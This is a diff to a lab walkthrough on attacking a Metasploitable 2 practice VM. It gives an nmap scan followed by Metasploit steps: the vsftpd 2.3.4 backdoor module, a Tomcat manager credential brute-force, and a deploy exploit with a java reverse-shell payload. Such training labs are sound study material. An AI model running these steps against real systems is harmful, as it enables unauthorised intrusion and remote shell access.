@@ -1,3 +1,11 @@
+In this project, we will hack metasploitable machine in many ways. You can download metasploitable v2 from here https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
+
+Then start it in a VM 
+Tip: use Briged Adapter in Netowrk
+
+################################################################################################
+First we scan our target IP which is: 192.168.0.117
+
 nmap -O -A -sV 192.168.0.117
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-13 18:29 EET
@@ -105,12 +113,15 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 31.26 seconds
 
 
+################################################################################################
+
+NOW WE OPEN METASPLOIT AND START HACKIN'
 
 ################################################################################################
 21/tcp   open  ftp   
 
 
-searched for ftpserver vsftpd 2.3.4 vulnerabilites and i found (unix/ftp/vsftpd_234_backdoor)
+searched for ftpserver vsftpd 2.3.4 vulnerabilites and i found this backdoor(unix/ftp/vsftpd_234_backdoor)
 
 msf > use unix/ftp/vsftpd_234_backdoor
 msf auxiliary(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.0.117
@@ -333,8 +344,30 @@ msf exploit(linux/postgres/postgres_payload) > exploit
 and you have full shell access.
 
 ################################################################################################
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
 
+we first try user:pass brute-force to get access.
 
+msf > use auxiliary/scanner/http/tomcat_mgr_login 
+msf auxiliary(scanner/http/tomcat_mgr_login) > set  RPORT 8180
+msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.0.117
+msf auxiliary(scanner/http/tomcat_mgr_login) > exploit
+
+we found tomcat:tomcat as administrator username and password.
+
+now we try to get shell access. 
+
+msf > use multi/http/tomcat_mgr_deploy
+msf exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
+msf exploit(multi/http/tomcat_mgr_deploy) > set RHOST 192.168.0.117
+msf exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set payload java/shell/reverse_tcp 
+msf exploit(multi/http/tomcat_mgr_deploy) > exploit
+
+we now have shell access :) 
+
+################################################################################################
 
 
 
